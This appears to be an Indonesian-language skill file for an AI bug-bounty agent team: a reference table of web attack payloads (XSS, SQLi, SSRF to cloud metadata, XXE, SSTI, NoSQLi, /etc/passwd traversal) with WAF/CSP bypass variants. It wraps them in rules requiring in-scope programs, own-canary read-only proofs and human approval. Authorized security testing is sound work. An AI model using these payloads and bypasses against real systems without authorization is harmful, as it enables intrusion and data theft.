# Skill: Arsenal Payload & Bypass — Tabel Rujukan Terpusat Pengujian

> **BELUM DIUJI — dibangun dari riset, bukan pengalaman teruji.** Seluruh isi di bawah ini adalah tabel rujukan dari riset (referensi: `~/workspace/catatan/riset-tambahan-skill-bounty-2026-11-24.md` Bagian 4 kandidat 57, Agentic-Bug-Hunter `security-arsenal` + Claude-BugHunter `security-arsenal`), bukan pengalaman teruji sampai ada temuan yang lolos triase dan dicatat di log. Label ini berlaku untuk semua bagian.

## Pemicu (kapan dipakai)

- Memulai pengujian kelas kerentanan apa pun dan butuh memilih payload yang tepat untuk konteks target (bukan mencoba payload acak).
- WAF/CSP memblokir payload standar dan butuh varian bypass yang terdokumentasi.
- Perlu memeriksa cepat apakah sebuah kelas bug "selalu ditolak" atau "hanya valid bila dirantai" SEBELUM menghabiskan waktu mengujinya.
- Skill ini adalah TABEL RUJUKAN — dipakai BERSAMA skill perburuan per kelas, bukan sebagai pengganti.

## Pemilik + penanggung jawab

| Peran | Agent | Tugas |
|---|---|---|
| Pengerjaan | **A62** | Memilih payload dari tabel + mencatat mana yang bekerja di target |
| Audit | **A60 Security Auditor** | Memeriksa apakah bukti tiap temuan memenuhi gerbang validasi |
| Pemimpin | **Muse** | Memutuskan temuan mana yang maju ke triase |

## Sudah tercakup (jangan diduplikat)

- **Mutasi payload dari respons WAF** (adaptasi payload berdasarkan apa yang diblokir) → skill `mutasi-payload-dinamis`. Skill ini TIDAK mengulang teknik mutasinya — hanya inventaris payload + bypass yang bisa dipilih sebelum mutasi.
- **Iterasi payload** (perulangan perbaikan payload) → skill `rekonstruksi-iterasi-payload`. Skill ini TIDAK mengulang alur iterasinya — hanya titik awal (payload dasar per konteks).
- **Daftar pola yang selalu ditolak** → skill `daftar-tolak-selalu`. Skill ini TIDAK menyalin daftar itu — tabel di bawah hanya merujuknya dan menambah kolom "hanya valid bila dirantai".
- **Teknik per kelas** (cara menguji XSS, SQLi, SSRF, XXE) → skill per kelas masing-masing (`verifikasi-xss`, `injeksi-sql-kontekstual`, `ssrf-oast`, `injeksi-xxe`, `fondasi-kerentanan-web-api`). Skill ini hanya tabel pemilih payload, bukan panduan pengujiannya.

## Aturan keras

1. **Hanya program bounty resmi in-scope** (Muse/Meta, OpenAI Safety, 0din, Google AI VRP, ViKernel, huntr). Pastikan seluruh endpoint yang diuji tercantum in-scope sebelum analisis dimulai.
2. **Hanya akun sendiri + canary palsu.** Semua payload memakai canary milik sendiri sebagai penanda (mis. `canary-own-test-123`), bukan data orang lain.
3. **Tanpa data orang lain.**
4. **Tanpa uji korban (victim-agent fraud tests DIBLOKIR — jangan dicoba).**
5. **Tanpa DoS / resource exhaustion** — dilarang payload yang membanjiri atau menghabiskan resource (mis. payload XXE billion laughs, SQLi `SLEEP` berulang, SSRF ke internal yang berat).
6. **Tanpa payload di permukaan publik.** Payload HANYA dikirim ke endpoint in-scope pada sesi uji sendiri; JANGAN menaruh payload di komentar/forum/profil publik target.
7. **Validasi human-in-the-loop (AI bantu, manusia putuskan dan validasi).**
8. **Tanpa laporan tanpa persetujuan Cipta.**
9. **Patuhi larangan otomasi program (huntr "Humans only"; Gray Swan dilewati total — jangan buat skill untuknya).**
10. **Larang aksi destruktif (DROP, DELETE, hapus/ubah data)** — payload pembuktian harus read-only: `SELECT` dengan canary, XSS dengan `alert(document.domain)` / callback canary sendiri, SSRF ke server canary sendiri. **DILARANG:** payload `DROP TABLE`, `DELETE`, `UPDATE` data, atau RCE yang mengubah state server.
11. **Satu payload, satu konteks.** Jangan menembakkan seluruh tabel ke satu endpoint — pilih 1–3 payload yang cocok dengan konteks (reflected/stored, filter yang teramati), uji, catat hasilnya, baru pilih berikutnya.

## Langkah + gerbang

### Gerbang 1 — Pilih payload berdasarkan konteks (bukan acak)

Tentukan dulu konteks target (dari skill perburuan per kelas), lalu pilih dari tabel di bawah. Standar lulus: konteks tercatat + payload yang dipilih dicatat alasannya.

### Tabel A — Payload dasar per kelas (penanda canary milik sendiri)

| Kelas | Payload dasar (read-only, canary) | Konteks yang cocok |
|---|---|---|
| XSS reflected | `"><svg onload=alert(document.domain)>` ; `"><img src=x onerror=alert(document.domain)>` | Parameter yang menggema di HTML |
| XSS stored | `<img src=x onerror=fetch('https://canary-sendiri/?c='+document.domain)>` — HANYA ke canary sendiri | Field yang tersimpan + dirender ke pengguna lain (bukti: callback canary sendiri saat SESI SENDIRI membukanya) |
| SQLi | `' OR '1'='1` (auth bypass, sesi sendiri) ; `' UNION SELECT 'canary-own-test-123',2,3--` | Parameter yang masuk query |
| SSRF | `https://canary-sendiri/abc123` (callback canary) ; `http://169.254.169.254/` HANYA bila program mengizinkan + bukti DNS/callback, bukan isi metadata | Parameter URL / webhook / fetch server-side |
| XXE | `<!ENTITY xxe SYSTEM "https://canary-sendiri/xxe">` (callback canary, bukan file lokal) | Unggah XML / endpoint SOAP |
| SSTI | `{{7*7}}` / `${7*7}` / `<%= 7*7 %>` (bukti `49`, read-only) | Template engine (lihat `injeksi-template-ssti`) |
| NoSQLi | `{"$gt": ""}` / `{"username": {"$ne": null}}` (sesi sendiri) | Login / query MongoDB |
| LFI / traversal | `../../../../etc/passwd` — HANYA baca file publik sistem, bukan file aplikasi/data pengguna | Parameter file/path |

### Tabel B — Bypass WAF / CSP (dipakai bila payload dasar diblokir)

| Yang diblokir | Varian bypass |
|---|---|
| Kata kunci (`alert`, `script`, `onerror`) | Encoding (HTML entity, URL encode ganda, Unicode), pemecah kata (`al/**/ert`, konkatenasi string), tag alternatif (`<svg>`, `<details open ontoggle>`, `<math>`) |
| Tanda kutip / kurung | Payload tanpa kutip (backtick, `String.fromCharCode`), event handler tanpa `()` via `throw` / `onerror=...` |
| CSP `script-src 'self'` | Cari gadget JSONP / Angular / pustaka yang sudah di-whitelist; injeksi lewat `style` / `href="javascript:..."` bila diizinkan CSP |
| Filter SQLi (`UNION`, spasi) | Komentar inline (`/**/ `), alternatif spasi (tab, newline), tanpa `UNION` (boolean-blind / error-based) |
| Filter SSRF (blocklist IP) | Redirect canary sendiri → target (bila redirect diikuti), encoding IP (0xA9FEA9FE, desimal), DNS rebinding HANYA ke canary sendiri |

Bila satu varian diblokir, catat respons WAF-nya dan lanjutkan ke `mutasi-payload-dinamis` untuk adaptasi sistematis — jangan menebak buta.

### Tabel C — Pola grep `gf` (pencarian cepat di respons / JS / log)

| Pola `gf` | Yang dicari |
|---|---|
| `gf xss` | Parameter yang menggema di respons |
| `gf sqli` / `gf ssrf` | Parameter `id`, `url`, `redirect`, `file`, `path` |
| `gf lfi` | Parameter file/path |
| `gf redirect` | Parameter `next`, `return`, `continue`, `url` |
| `gf ssti` | Parameter template / nama |
| `gf idor` | Parameter ID numerik / UUID di URL dan body |

### Tabel D — Selalu ditolak vs hanya valid bila dirantai

| Kategori | Keputusan |
|---|---|
| Selalu ditolak | Lihat `daftar-tolak-selalu` (jangan disalin ke sini) — periksa SEBELUM menguji |
| Hanya valid bila dirantai | Open redirect → rantai ke pencurian token OAuth/ATO; missing rate-limit → rantai ke brute force akun uji sendiri; info disclosure kecil → rantai ke IDOR; SSRF yang hanya resolve DNS → BUKAN temuan (butuh body respons / metadata) |
| Butuh bukti dampak | Self-XSS, CORS `*` tanpa credentials, clickjacking non-sensitif — lihat `gerbang-tujuh-pertanyaan-triase` Pertanyaan 4 |

### Gerbang 2 — Uji + catat (satu payload per putaran)

Uji payload yang dipilih pada sesi sendiri, catat: payload persis, respons server, apakah canary terpanggil (SSRF/XSS stored), dan apakah filter terdeteksi. Bila diblokir, catat pola blokirnya untuk `mutasi-payload-dinamis`.

### Gerbang 3 — Gerbang validasi (sebelum maju ke skill per kelas)

1. **Payload tepat konteks:** payload yang dipilih cocok dengan konteks target (bukan acak) — bila tidak, kembali ke Gerbang 1.
2. **Pembuktian aman:** canary hanya milik sendiri; tidak ada data orang lain; tidak ada perubahan state (Aturan keras 10).
3. **Tidak ada duplikasi:** kelas yang diuji belum ada di `daftar-tolak-selalu` dan belum ditolak di `gerbang-tujuh-pertanyaan-triase`.

Setelah gerbang ini lolos, lanjutkan pengujian penuh di skill perburuan per kelas yang sesuai.

## Alat

| Alat | Cara pakai |
|---|---|
| Burp Suite Repeater / Intruder (manual, ritme aman) | Kirim payload satu per satu; lihat `pacing-request-aman` |
| `gf` (Gf-Patterns) | Pencarian cepat parameter menarik di respons/JS |
| Server canary milik sendiri | Satu-satunya tujuan callback SSRF/XSS stored |
| `mutasi-payload-dinamis`, `rekonstruksi-iterasi-payload` | Adaptasi/iterasi bila payload dasar diblokir |
| `~/workspace/catatan/log-bug-bounty.md` | Log payload yang dicoba + hasilnya |

## Format output

Tulis ke `~/workspace/catatan/log-bug-bounty.md` (bagian per tanggal) dengan format:

```
Target: [program + endpoint]
Konteks: [kelas + konteks: reflected/stored, filter yang teramati]
Payload dipilih: [payload persis + alasan pilih]
Hasil: [berhasil / diblokir + respons + canary terpanggil ya/tidak]
Keputusan: [lanjut ke skill per kelas / mutasi / tolak + alasan]
Status: [dipetakan / diuji / terbukti / dilaporkan / ditolak]
```

## Batasan yang diketahui

- Metodologi ini dari riset (Agentic-Bug-Hunter + Claude-BugHunter `security-arsenal`), bukan pengalaman teruji — tiap tabel butuh satu kasus nyata yang lolos triase sebelum label BELUM DIUJI dicabut.
- Tabel ini adalah titik awal, bukan daftar lengkap — payload baru dari `mutasi-payload-dinamis` dan `rekonstruksi-iterasi-payload` harus ditambahkan ke tabel bila terbukti bekerja (catat di log, bukan di skill ini, sampai terverifikasi).
- WAF modern (Cloudflare, Akamai) memblokir sebagian besar payload dasar — nilai skill ini ada pada PEMILIHAN konteks yang tepat + bypass yang terdokumentasi, bukan pada volume payload.
- Payload di tabel ini bersifat read-only/canary — JANGAN mengganti canary dengan data nyata atau payload destruktif.
